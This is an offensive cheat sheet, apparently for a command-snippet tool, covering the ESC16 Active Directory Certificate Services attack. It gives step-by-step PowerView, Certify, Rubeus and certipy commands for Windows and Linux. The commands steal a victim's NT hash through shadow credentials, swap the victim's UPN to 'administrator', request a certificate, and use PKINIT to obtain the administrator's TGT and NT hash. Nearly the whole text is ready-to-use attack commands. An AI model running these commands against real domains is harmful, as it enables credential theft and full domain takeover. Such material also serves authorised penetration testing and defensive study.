---
technique: ESC16 - Disabled SID Security Extension
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc16 certificate-services pkinit
---

# ESC16 - Disabled SID Security Extension

ESC16 abuses a globally disabled SID security extension on the CA, combining UPN rewrite and certificate request flows.

## Windows

### ESC16: Step 1: rewrite victim UPN to administrator (PowerView)

#powershell #powerview #no-sid-extension #ca-wide #upn-swap

Rewrite victim UPN to administrator to abuse the CA-wide security SID extension disable.

```powershell title:"ESC16: set victim UPN to administrator"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='administrator'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

### ESC16: Step 2: request cert as victim (Certify)

#powershell #certify #no-sid-extension #ca-wide

Request a cert from any auth template while the victim's UPN maps to administrator.

```powershell title:"ESC16: request cert while victim UPN is administrator"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC16: Step 3: restore victim UPN (PowerView)

#powershell #powerview #no-sid-extension #ca-wide

Restore the victim's original UPN.

```powershell title:"ESC16: restore victim UPN"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$victim_user@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

### ESC16: Step 4: PKINIT as administrator (Rubeus)

#powershell #rubeus #pkinit

Authenticate with PKINIT using the issued cert to obtain the administrator TGT and NT hash.

```powershell title:"ESC16: PKINIT with issued cert to get administrator TGT"
.\Rubeus.exe asktgt /getcredentials /certificate:"$cert_b64" /password:"$pfx_pass" /domain:"$domain" /dc:"$dc_name" /show
```
<!-- cheat
import domain_ip
import users
var cert_b64
var pfx_pass
var dc_name
-->

## Linux

### ESC16: Step 1: obtain victim NT hash via shadow credentials (certipy)

#certipy #shadow-credentials #no-sid-extension #ca-wide

Get the victim's NT hash via shadow credentials for subsequent impersonation.

```sh title:"ESC16: shadow auto to get victim NT hash"
certipy shadow auto -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim_user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC16: Step 2: rewrite victim UPN to administrator (certipy)

#certipy #no-sid-extension #ca-wide #upn-swap

Rewrite the victim's UPN to administrator to abuse the CA-wide security extension disable.

```sh title:"ESC16: update victim UPN to administrator"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn administrator -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC16: Step 3: request cert as victim (certipy)

#certipy #no-sid-extension #ca-wide

Request a cert using the victim's Kerberos ticket while their UPN is administrator.

```sh title:"ESC16: request User cert while victim UPN is administrator"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
-->

### ESC16: Step 4: restore victim UPN (certipy)

#certipy #no-sid-extension #ca-wide #upn-swap

Restore the victim's original UPN.

```sh title:"ESC16: restore victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim_user@$domain -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC16: Step 5: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the administrator TGT and NT hash.

```sh title:"ESC16: PKINIT with administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->
